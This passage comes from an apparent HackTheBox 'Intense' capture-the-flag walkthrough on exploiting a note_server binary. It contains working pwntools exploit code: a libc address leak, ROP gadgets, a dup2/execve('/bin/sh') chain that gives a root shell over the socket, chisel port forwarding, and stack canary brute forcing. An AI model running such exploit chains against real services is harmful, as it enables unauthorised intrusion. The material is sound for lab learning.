      **0x555555554000**     0x555555556000     0x2000        0x0 /Lab/htb/Intense/note_server
      0x555555755000     0x555555756000     0x1000     0x1000 /Lab/htb/Intense/note_server
      0x555555756000     0x555555757000     0x1000     0x2000 /Lab/htb/Intense/note_server
      0x555555757000     0x555555778000    0x21000        0x0 [heap]
      0x7ffff7dd7000     0x7ffff7df9000    0x22000        0x0 /lib/x86_64-linux-gnu/libc-2.28.so
gdb-peda$ **p 0X0000555555554f54 - 0x0000555555554000**
**$3 = 0xf54**
```

Here our return address is **0X0000555555554f54** and the and base address of program is  **0x555555554000** so the offset  **0xf54**  And because that offset is always the same. I can calculate for any run that the base address will be the leaked return address minus **0xf54**

#### Code

```
base_address = rip - 0xf54 # 0x caught with the (rip - base addresse) For base address gdb-peda$ vmmap and   gdb-peda$ p 0X0000555555554f54 - 0x0000555555554000
```

#### Get Gadgets:

I'll need gadgets that allow me to set rdi, rsi, and rdx, as well as the GOT address for write to leak, and the PLT address for write to call. I'll get gadgets by typing rop at the gdb-peda$ prompt:

Firstly i tried to get gadgets using the python pwntools ROP class like:

```
def read_write_libc_fct_address(binary,canary,rbp,base_address):

   elf= ELF(binary, checksec=False)
   elf.address = base_address
   rop = ROP(elf)
   # create the rop gadgets representing : write(file_descriptot=4,write@GOT())  file_descriptor = 4 ( our client )
   rop.write(FILE_DESCRIPTOR,elf.got['write'])
   log.info('stage 1 ROP Chain :' + rop.dump())
   len_rop=len(rop.chain())
   ## try got write
   payload_fullbuff=put_payload_into_notebuffer(canary,rbp,rop.chain(),False)

   #Now index =1024, let's use CMD2 and define offset as 4 and use memcpy() to copy the canary rbp and rop into the end of the node[]
   copy_size = 8+16+len_rop # the size of buffer to cpy
   payload_bof =copy_to_note(4,copy_size)

   # send to payload
   p = remote(args.ip,args.port)
   p.send(payload_fullbuff)  # send the payload to put all in the note buffer
   p.send(payload_bof)   # throw bof wiht cmd2
   # read the first buffer+copying data over the buffer
   data= p.recv(1024+copy_size)

   print(colored("Data Length %s"%len(data),"green"))
   #print(colored("Data: %s"%binascii.hexlify(data),"green"))
   write_libc_address = p.recv(8,timeout=4) # read the write() address with the rop chains. its the write address from Libc
   write_libc_address_formed =struct.pack(">Q",u64(write_libc_address))
   print(colored("write_plt_address Length %s"%len(write_libc_address),"green"))
   print(colored("write_plt_address: 0x%s  "%binascii.hexlify(write_libc_address_formed).decode(),"green"))
   p.close()
   return u64(write_libc_address)

```

###  Local libc

The GOT address will hold the address of "write" in libc as it's loaded. That's what I want to leak. The PLT is the table of code that contains the stubs to call the dynamic linker. So the first time a function is called, the GOT jump right back to the PLT which calls the linker. The linker updates the GOT so the next time it's called, it goes right to the function in libc. The PLT address will be constant relative to the program base. I finally have to find the offset of functions and gadgets etc.. and calculate the libc base address.

#### Code 

```
	     **# readelf -s remote_libc.so | grep -e " dup2@@GLIBC" -e " execve@@GLIBC" -e " write@@GLIBC"**
              #999: 00000000001109a0    33 FUNC    WEAK   DEFAULT   13 dup2@@GLIBC_2.2.5
              #1491: 00000000000e4e30    33 FUNC    WEAK   DEFAULT   13 execve@@GLIBC_2.2.5
              #2246: 0000000000110140   153 FUNC    WEAK   DEFAULT   13 write@@GLIBC_2.2.5


	     **# strings -a -t x remote_libc.so | grep -i "/bin/sh"**
		# 1b3e9a /bin/sh

	    **#  rp-lin-x64 -f remote_libc.so --unique -r 1 | grep -i "pop rdi "**
	       # 0x0002155f: pop rdi ; ret  ;  (490 found)

	    **#  rp-lin-x64 -f remote_libc.so --unique -r 1 | grep -i "pop rsi"**
	       # 0x00023e6a: pop rsi ; ret  ;  (147 found)

	    **#  rp-lin-x64 -f remote_libc.so --unique -r 1 | grep -i "pop rdx"**
	       # 0x00001b96: pop rdx ; ret  ;  (6 found)

	       write_offset_libc= 0x0000000000110140
	       dup2_offset_libc = 0x00000000001109a0
	       execve_offset_libc = 0x00000000000e4e30
	       binsh_offset_libc =  0x1b3e9a
	       pop_rdi_ret_offset = 0x0002155f
	       pop_rsi_ret_offset = 0x00023e6a
	       pop_rdx_ret_offset = 0x00001b96

	       libc_base = write_libc_address - write_offset_libc
	       dup2_address = p64(dup2_offset_libc + libc_base)
	       execve_address = p64(execve_offset_libc+libc_base)
	       binsh_address = p64(binsh_offset_libc+libc_base)   
	       pop_rdi_ret_address = p64(pop_rdi_ret_offset +libc_base)
	       pop_rsi_ret_address = p64(pop_rsi_ret_offset +libc_base)
	       pop_rdx_ret_address = p64(pop_rdx_ret_offset +libc_base)
```

Putting all of that together, i have the following code:

###### Nota: 

**When we execute the shell with "execve("/bin/sh",0,0)" function we have to redirect the output(stdout), the input(stdin) and the error(stderr) to the client file descriptor socket.**

The file descriptor number for the client where the reverse shell should redirect the (stdin,stdout,sterror)
```
  0x0000555555554de8 <+654>:	**movzx  edx,WORD PTR [rbp-0x412]**
   0x0000555555554def <+661>:	lea    rcx,[rbp-0x410]
   0x0000555555554e29 <+655>:	mov    eax,DWORD PTR [rbp-0x424]
   0x0000555555554e2f <+661>:	mov    rsi,rcx
   0x0000555555554e32 <+664>:	mov    edi,eax
   0x0000555555554e34 <+666>:	call   0x555555554980 <write@plt>
```

Here the sock == file descriptor is the first argument of the function "write(sock,note,index)". This argument is passed through the edi, and edi is the value of 'DWORD PTR [rbp-0x424]"

**edi is 4bytes from [rbp-0x424]**

```
gdb-peda$ x/4b $rbp-0x424
0x7fffffff8b9c:	**0x04**	0x00	0x00	0x00
```
#### Code 

```
  # create payloads
       # first rop chains to execute: dup2(FILE_DESCRIPTOR,1) 
       # in asm:
        #pop rdi, ret # set the arg1 (File_DESCRIPTOR==4)
        #pop rsi, ret # set arg2      (stdout=1)
        #call dup2(4,1) redirect stout
       payload_dup2=pop_rdi_ret_address
       payload_dup2+=p64(FILE_DESCRIPTOR)
       payload_dup2+=pop_rsi_ret_address
       payload_dup2+=p64(1)
       payload_dup2+=dup2_address
        #call dup2(4,0) redirect stdin
       payload_dup2+=pop_rdi_ret_address
       payload_dup2+=p64(FILE_DESCRIPTOR)
       payload_dup2+=pop_rsi_ret_address
       payload_dup2+=p64(0)
       payload_dup2+=dup2_address
        #call dup2(4,2) redirect stderror
       payload_dup2+=pop_rdi_ret_address
       payload_dup2+=p64(FILE_DESCRIPTOR)
       payload_dup2+=pop_rsi_ret_address
       payload_dup2+=p64(2)
       payload_dup2+=dup2_address
       
       # second ropchains to execve("/bin/sh",0,0)
       # in asm:
        #pop rdi, ret # set the arg1 ("/bin/sh" address)
        #pop rsi, ret # set arg2      (0)
        #pop rdx, ret # set arg3      (0)
        #call execve
       payload_execve=pop_rdi_ret_address
       payload_execve+=binsh_address
       payload_execve+=pop_rsi_ret_address
       payload_execve+=p64(0)
       payload_execve+=pop_rdx_ret_address
       payload_execve+=p64(0)
       payload_execve+=execve_address
       # Final payload
       final_payload= payload_dup2 +payload_execve
```

#### Test in Remote

I created a python script which exploit the binary locally using the same binary with same debugging modification, and the local libc, and also with the remote binary.

###### Nota:
**The server run locally so i had to use chisel to forward the port 5001, in my machine :**

```
$ ./chisel client --max-retry-count 1  10.10.14.X:8000 R:5001:127.0.0.1:5001
```

![chisel](https://github.com/roughiz/Intense-walktrough/blob/master/images/chisel.png)

And i can see the port 5001 listening  in my machine :

```
$ lsof -ni :5001         
COMMAND  PID    USER   FD   TYPE   DEVICE SIZE/OFF NODE NAME
chisel  6499 user    6u  IPv4 10349808      0t0  TCP *:5001 (LISTEN)
```


### Root shell 

#### Exploit [code](https://github.com/roughiz/Intense-walktrough/blob/master/code/root.py)

```
$ python3 root.py -i 127.0.0.1 -p 5001
```

![chisel](https://github.com/roughiz/Intense-walktrough/blob/master/images/root_shell.png)

## Let's dig more deeper

We Suppose that the developer verified that the offest is **0<offset<index** that's means that we can't read the canary.

#### C code 
```
                // sanity check: offset must be > 0 and < index
                if (offset < 0 || offset >= index) {
                    exit(1);
                }
```

But we have a message after the handle_client() function like :

```

        if (pid == 0) {
            /* This is the client process */
            close(sockfd);
            handle_client(newsockfd);
            char * end_msg = "Thanks for your visit !";
            **write(newsockfd, end_msg,strlen(end_msg));**
            exit(0);
        }
```

#### Brute Force Canary

Now I can use a known canary attack, which to brute force the canary value. I can send 256 requests, each with 8 bytes of junk and a unique 9th byte. That 9th byte will overwrite the low byte of the canary (which is always 00). The 255 non-zero requests will return no additional data, or an end of file if I try to read from the socket. The request with 8bytes of junk + ‘0x00' will return "Thanks for your visit !". I can do that same for the next 7 bytes to get the full canary. Now I can overwrite the canary and continue on to overwrite the return address.

#### Code

```
def payload_template_header(header):
    payload=b""
    payload+=CMD1+ binascii.unhexlify("04"+4*"41") # 4 byte ant the strat of the offset 
    payload+= CMD1+ binascii.unhexlify("08"+8*"42") # 8 bytes of junk just before reach the canary
    if len(header) > 0:
      payload+= CMD1+ struct.pack('<B',len(header))+header # add heade bytes 
    return payload

def put_over_buffer(p,nb):
    payload_bof = CMD2
    payload_bof += struct.pack('<H',4) #"\x04\x00" # 2byts wich represent 4bytes(offset)  ( 0<offset<=index) In little endian
    payload_bof+= struct.pack('<B',nb) #"\xff"     # try to put 255 bytes over the buffer(copy_size) this puted bytes represent pattern
    payload_bof+= READ_BUFFER
    p.send(payload_bof)

def payload_template_footer(buff):
    for i in range(0,3): # print 255*3 why 255 cause we can also have 1 byte to put the size of the bufffer to write into notes so we will send =>4+255+3*255= 4+255+765= 1024 (255=0xff)
        buff+= CMD1+binascii.unhexlify("ff"+255*"43")
    return buff 

def get_next_byte(s, r,k,header):# buffer,range,bruteforced_block_bytes_number,data_before_block
    #try each byte from int(0) to int(255) until it works 
    for i in r:
        p = remote(args.ip,args.port)
        try:
            payload= payload_template_header(header)
            len_head_bfr_brut=8+len(header)
            len_of_new_pld =255-len_head_bfr_brut-len(s)-1
            payload+=CMD1 +struct.pack('<B',255-len_head_bfr_brut) # preapre the payload lenght with cmd1
            payload+=s + i.to_bytes(1,'big') +binascii.unhexlify(len_of_new_pld*"43")
            payload= payload_template_footer(payload)
            p.send(payload)
            put_over_buffer(p,len_head_bfr_brut+k) # 8 bytes before reach the canary + k bytes to test
            p.recvuntil('visit !', timeout=2) #if we receive the message "..visit !" that's mean hat the byte works great.
            p.close()
            return i.to_bytes(1,'big')
        except EOFError:
            #print("No response. maybe smach %s"% i.to_bytes(1,'big'))
            p.close()
    import pdb   # Shouldn't get here
    pdb.set_trace()
    print("Failed to find byte")


def brute_word(num_bytes, obj, assumed=b'', header=b''):
    start = time.time()
    result = assumed
    print(header)
    with log.progress(f'Brute forcing {obj}') as p:
        for i in range(num_bytes):
            current = '0x' + ''.join([f'{x:02x}' for x in result[::-1]]).rjust(16,'_')  # write the string '0x________________'
            p.status(f'Found {len(result)} bytes: {current}')
            byte = None
            context.log_level = 'error'  # Hide "Opening connection" and "Closing connection" messages
            while byte == None:          # If no byte found, over range again
                byte = get_next_byte(result, range(0,255),i+1,header)
            result = result + byte
            context.log_level = 'info'   # Re-enable logging
        p.success(f'Finished in {time.time() - start:.2f} seconds')

    log.success(f"{obj}:".ljust(20,' ') + f"0x{u64(result):016x}")
    return result

```

```
log.info("Starting brute force")
   
canary = brute_word(8, 'Canary')
ebp =    brute_word(8, 'ebp',b"",canary)
rip =    brute_word(8, 'rip',b"",canary+ebp)
```

![Image bruteforce ](https://github.com/roughiz/Intense-walktrough/blob/master/images/brtcanary.png)


